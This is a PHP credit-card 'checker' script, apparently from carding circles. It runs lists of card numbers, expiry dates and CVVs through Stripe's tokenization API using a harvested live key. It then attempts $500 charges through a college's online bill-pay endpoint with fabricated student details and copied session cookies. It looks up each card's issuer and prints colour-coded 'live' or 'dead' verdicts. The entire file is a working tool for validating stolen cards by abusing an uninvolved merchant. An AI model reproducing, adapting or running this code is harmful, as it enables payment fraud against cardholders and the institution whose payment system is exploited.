<?php
error_reporting(0); // don't remove
# Brodicakes

# Functions
function GetStr($string, $start, $end)
{
  $str = explode($start, $string);
  $str = explode($end, $str[1]);
  return $str[0];
}
function multiexplode($delimiters, $string)
{
  $one = str_replace($delimiters, $delimiters[0], $string);
  $two = explode($delimiters[0], $one);
  return $two;
}

# Vars
$lista = $_GET['lista'];
$cc = multiexplode(array(":", "|", ""), $lista)[0];
$binh = substr($cc, 0, 6);
$trest = substr($cc, 6, 16);
$mm = multiexplode(array(":", "|", ""), $lista)[1];
$yyyy = multiexplode(array(":", "|", ""), $lista)[2];
$cvv = multiexplode(array(":", "|", " "), $lista)[3];

$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://api.stripe.com/v1/tokens');
curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
curl_setopt($ch, CURLOPT_POST, 1);
$headers = array();
$headers[] = 'Host: api.stripe.com';
$headers[] = 'accept: application/json';
$headers[] = 'user-agent: Mozilla/5.0 (Linux; Android 11; CPH1911) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.185 Mobile Safari/537.36';
$headers[] = 'content-type: application/x-www-form-urlencoded';
$headers[] = 'origin: https://js.stripe.com';
$headers[] = 'sec-fetch-site: same-site';
$headers[] = 'sec-fetch-mode: cors';
$headers[] = 'sec-fetch-dest: empty';
$headers[] = 'referer: https://js.stripe.com/';
$headers[] = 'accept-language: en-US,en;q=0.9';
curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_POSTFIELDS, 'card[number]='.$cc.'&card[cvc]='.$cvv.'&card[exp_month]='.$mm.'&card[exp_year]='.$yyyy.'&guid=916fa63f-4283-4e52-aab3-d9462a90ccf3cf9e3c&muid=eb8d6123-09f4-4f7e-b350-c7d27d408516427aaa&sid=2c4bbb03-0d03-4aa2-9c5d-b6f07ea239dddab977&payment_user_agent=stripe.js%2F5c9ad5f6c%3B+stripe-js-v3%2F5c9ad5f6c&time_on_page=58220&referrer=https%3A%2F%2Fpotomac.edu%2F&key=pk_live_XeaBrjFhmGzsvThCxP8vh90H00tmBB0L1k');
$res1 = curl_exec($ch);
curl_close($ch);

$token = trim(strip_tags(getStr($res1,'"id": "tok_','"')));

$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://potomac.edu/stripe/charge.php');
curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
curl_setopt($ch, CURLOPT_POST, 1);
$headers = array();
$headers[] = 'Host: potomac.edu';
$headers[] = 'accept: */*';
$headers[] = 'x-requested-with: XMLHttpRequest';
$headers[] = 'user-agent: Mozilla/5.0 (Linux; Android 11; CPH1911) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.185 Mobile Safari/537.36';
$headers[] = 'token: tok_'.$token.'';
$headers[] = 'content-type: application/x-www-form-urlencoded; charset=UTF-8';
$headers[] = 'origin: https://potomac.edu';
$headers[] = 'sec-fetch-site: same-origin';
$headers[] = 'sec-fetch-mode: cors';
$headers[] = 'sec-fetch-dest: empty';
$headers[] = 'referer: https://potomac.edu/students/online-bill-pay/';
$headers[] = 'accept-encoding: gzip, deflate, br';
$headers[] = 'accept-language: en-US,en;q=0.9';
$headers[] = 'cookie: __cfduid=d6dc0c651ce51eaae1f7f63198b7d00741611458157';
$headers[] = 'cookie: uncode_privacy[consent_types]=%5B%5D';
$headers[] = 'cookie: uncodeAI.screen=424';
$headers[] = 'cookie: uncodeAI.images=2631.5999507904053';
$headers[] = 'cookie: uncodeAI.css=424x918@16';
$headers[] = 'cookie: _gcl_au=1.1.1079859075.1611458160';
$headers[] = 'cookie: _ga=GA1.2.16939535.1611458160';
$headers[] = 'cookie: _gid=GA1.2.759916916.1611458160';
$headers[] = 'cookie: _gat_gtag_UA_9063770_1=1';
$headers[] = 'cookie: _fbp=fb.1.1611458160310.815978587';
$headers[] = 'cookie: lgw_seats_8=5';
$headers[] = 'cookie: lgw_seats_last_update_8=2021%2F01%2F24';
$headers[] = 'cookie: _hjid=13ed51f6-cbc6-4f05-ad00-e28f4d33a1c4';
$headers[] = 'cookie: _hjFirstSeen=1';
$headers[] = 'cookie: _hjIncludedInPageviewSample=1';
$headers[] = 'cookie: _hjAbsoluteSessionInProgress=0';
$headers[] = 'cookie: wcsid=rfBdvmNvLQ7HwYHh514JQ0H0bta6gryB';
$headers[] = 'cookie: hblid=GAp6OBr9pklz2Jg2514JQ0H0yobg6aBB';
$headers[] = 'cookie: _oklv=1611458161914%2CrfBdvmNvLQ7HwYHh514JQ0H0bta6gryB';
$headers[] = 'cookie: PHPSESSID=q4ugka0hakkria768gdkop6l1a';
$headers[] = 'cookie: _okdetect=%7B%22token%22%3A%2216114581625340%22%2C%22proto%22%3A%22https%3A%22%2C%22host%22%3A%22potomac.edu%22%7D';
$headers[] = 'cookie: __stripe_mid=eb8d6123-09f4-4f7e-b350-c7d27d408516427aaa';
$headers[] = 'cookie: __stripe_sid=2c4bbb03-0d03-4aa2-9c5d-b6f07ea239dddab977';
$headers[] = 'cookie: olfsk=olfsk13570287722981522';
$headers[] = 'cookie: _ok=6236-888-10-4015';
$headers[] = 'cookie: _okbk=cd5%3Davailable%2Ccd4%3Dtrue%2Cvi5%3D0%2Cvi4%3D1611458163389%2Cvi3%3Dactive%2Cvi2%3Dfalse%2Cvi1%3Dfalse%2Ccd8%3Dchat%2Ccd6%3D0%2Ccd3%3Dfalse%2Ccd2%3D0%2Ccd1%3D0%2C';
curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_POSTFIELDS, 'student_name=Fucks&student_id=8392729&name=Titeng+Malaki&email=titingmalaki%40ethereal.email&address_line1=190+Corpening+Road&address_city=New+York&address_state=NY&address_zip=10080&amount=500&purpose=Brodicames');
$res2 = curl_exec($ch);
curl_close($ch);

//BinCheck//
$bin = substr("$cc", 0, 6);
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://bincheck.io/');
curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
curl_setopt($ch, CURLOPT_POST, 1);
$headers = array();
$headers[] = 'Host: bincheck.io';
$headers[] = 'cache-control: max-age=0';
$headers[] = 'upgrade-insecure-requests: 1';
$headers[] = 'origin: https://bincheck.io';
$headers[] = 'content-type: application/x-www-form-urlencoded';
$headers[] = 'accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9';
$headers[] = 'sec-fetch-site: same-origin';
$headers[] = 'sec-fetch-mode: navigate';
$headers[] = 'sec-fetch-user: ?1';
$headers[] = 'sec-fetch-dest: document';
$headers[] = 'referer: https://bincheck.io/';
$headers[] = 'accept-language: en-US,en;q=0.9';
curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_POSTFIELDS, 'bin='.$bin.'');
$curl = curl_exec($ch);
curl_close($ch);

$type = trim(strip_tags(getStr($curl, 'Card Type','Card')));
$level = trim(strip_tags(getStr($curl, 'Card Level','Issuer Name / Bank')));
$bank = trim(strip_tags(getStr($curl, 'Issuer Name / Bank','Issuer / Bank Website')));
$country = trim(strip_tags(getStr($curl, 'ISO Country Name','Country Flag')));

if (empty($type)) {
  $type = "N/A";
}
if (empty($bank)) {
  $bank = "N/A";
}
if (empty($country)) {
  $country = "N/A";
}

if ((strpos($res2, "Your card's security code is incorrect.")) || (strpos($res1, "incorrect_cvc")) || (strpos($res2, "The card's security code is incorrect."))){
echo '<span class="badge bg-warning text-dark">#CCN</span> <span style="color: #FFFFFF">|</span> <span style="color: #FFFF00">'.$binh.'</span><span style="color: #FFFFFF">'.$trest.'|'.$mm.'|'.$yyyy.'|'.$cvv.'</span> <span style="color: #FFA500">CCN Match</span> <span style="color: #FFA500">E-Code: Incorrect CVC</span> <span style="color: #ADD8E6">'.$type.' -> '.$bank.' -> '.$country.'</span> <span style="color: #FFFFFF">|</span> <span style="color: #FFFFFF">Arceus</span>';
}
elseif ((strpos($res2, 'The card number is incorrect.')) || (strpos($res2, 'Your card number is incorrect.')) || (strpos($res2, 'incorrect_number'))){
echo '<span class="badge bg-danger">#DEAD</span> <span style="color: #FFFFFF">|</span> <span style="color: #FFFF00">'.$binh.'</span><span style="color: #FFFFFF">'.$trest.'|'.$mm.'|'.$yyyy.'|'.$cvv.'</span> <span style="color: #FFA500">Card Declined</span> <span style="color: #FFA500">E-Code: Incorrect Card Number</span> <span style="color: #ADD8E6">'.$type.' -> '.$bank.' -> '.$country.'</span> <span style="color: #FFFFFF">|</span> <span style="color: #FFFFFF">Arceus x THNDR</span>&nbsp&nbsp';
}
elseif ((strpos($res2, 'Your card has expired.')) || (strpos($res1, 'expired_card'))){
echo '<span class="badge bg-danger">#DEAD</span> <span style="color: #FFFFFF">|</span> <span style="color: #FFFF00">'.$binh.'</span><span style="color: #FFFFFF">'.$trest.'|'.$mm.'|'.$yyyy.'|'.$cvv.'</span> <span style="color: #FFA500">Card Declined</span> <span style="color: #FFA500">E-Code: Expired  Card</span> <span style="color: #ADD8E6">'.$type.' -> '.$bank.' -> '.$country.'</span> <span style="color: #FFFFFF">|</span> <span style="color: #FFFFFF">Arceus x THNDR</span>&nbsp&nbsp';
}
elseif ((strpos($res2, "Your card was declined.")) || (strpos($res2, 'The card was declined.')) || (strpos($res2, "card_declined"))){
echo '<span class="badge bg-danger">#DEAD</span> <span style="color: #FFFFFF">|</span> <span style="color: #FFFF00">'.$binh.'</span><span style="color: #FFFFFF">'.$trest.'|'.$mm.'|'.$yyyy.'|'.$cvv.'</span> <span style="color: #FFA500">Card Declined</span> <span style="color: #FFA500">E-Code: Your card was declined.</span> <span style="color: #ADD8E6">'.$type.' -> '.$bank.' -> '.$country.'</span> <span style="color: #FFFFFF">|</span> <span style="color: #FFFFFF">Arceus x THNDR</span>&nbsp&nbsp';
}
elseif ((strpos($res2, "Your card does not support this type of purchase.")) || (strpos($res1, "transaction_not_allowed"))){
echo '<span class="badge bg-danger">#DEAD</span> <span style="color: #FFFFFF">|</span> <span style="color: #FFFF00">'.$binh.'</span><span style="color: #FFFFFF">'.$trest.'|'.$mm.'|'.$yyyy.'|'.$cvv.'</span> <span style="color: #FFA500">Card Declined</span> <span style="color: #FFA500">E-Code: Card does not support this type of purchase.</span> <span style="color: #ADD8E6">'.$type.' -> '.$bank.' -> '.$country.'</span> <span style="color: #FFFFFF">|</span> <span style="color: #FFFFFF">Arceus x THNDR</span>&nbsp&nbsp';
}
else{
echo '<span class="badge bg-danger">#DEAD</span> <span style="color: #FFFFFF">|</span> <span style="color: #FFFF00">'.$binh.'</span><span style="color: #FFFFFF">'.$trest.'|'.$mm.'|'.$yyyy.'|'.$cvv.'</span> <span style="color: #FFA500">Card Declined</span> <span style="color: #FFA500">E-Code: '.$res2.'</span> <span style="color: #ADD8E6">'.$type.' -> '.$bank.' -> '.$country.'</span> <span style="color: #FFFFFF">|</span> <span style="color: #FFFFFF">Arceus</span>';
}
?>